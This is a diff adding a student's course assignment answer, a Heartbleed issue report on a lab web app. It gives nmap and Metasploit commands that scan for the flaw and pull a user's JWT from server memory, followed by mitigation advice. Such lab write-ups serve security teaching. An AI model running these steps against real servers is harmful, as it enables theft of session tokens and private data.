@@ -90,4 +90,44 @@ Group ID: TTV19S1
 ## Second part A10_2017-Insufficient_Logging & Monitoring (10 points)
 
 1. [Issue report] Using Components with Known Vulnerabilities: WasDat's heart is bleeding (5 pts)
-   1. 
+
+   **Title:** Attacker can capture the HTTP request to wasdat and see some unencrypted data.
+
+   **Description:** Since there is a known vulnerabilities in heartbleed version 1.0.1 and 1.0.2-beta and wasdat use this component. So, attacker can steal information intended to be protected by SSL/TSL encryption by using metasploit module.
+
+   **Step to produce:**
+
+   - Install nmap and metasploit
+
+   - Run `nmap -sV -p 443 --script=ssl-heartbleed.nse 192.168.1.43` to scan the heartbleed vulnerabitity. `192.168.1.43` is the my private IP address that run wasdat application. Result is shown below
+
+     <img src="/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week5/Screenshot/Screen Shot 2565-02-16 at 02.55.58.png" alt="Screen Shot 2565-02-16 at 02.55.58" style="zoom:50%;" />
+
+     You can see that there is a ssl-heartbleed vulnerability in wasdat application
+
+   - Run msfconsole `/opt/metasploit-framework/bin/msfconsole`
+
+     - Run `use auxiliary/scanner/ssl/openssl_heartbleed`
+
+     - Run `set verbose true`
+
+     - Run `set rhostss 192.168.1.43  ` 192.168.1.43 is the target IP address (wasdat)
+
+     - Run `run` to exploit. If there is a request to wasdat, the result will be like this
+
+       ![Screen Shot 2565-02-15 at 08.10.45](/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week5/Screenshot/Screen Shot 2565-02-15 at 08.10.45.png)
+
+     In this case you can see that we can capture the JWT of user for authorization
+
+   **Impact Estimation:** High serverity because attacker can capture the sensitive data inside the HTTP request such as JWT of user.
+
+   **Mitigation:**
+
+   According to official website of heartbleed, there are two ways for mitigation
+
+   - Upgrade to OpenSSL 1.0.1g
+   - Recompile OpenSSL with -DOPENSSL_NO_HEARTBEATS
+
+2. [Essay] Insufficient logging and monitoring (5 pts) 
+
+   
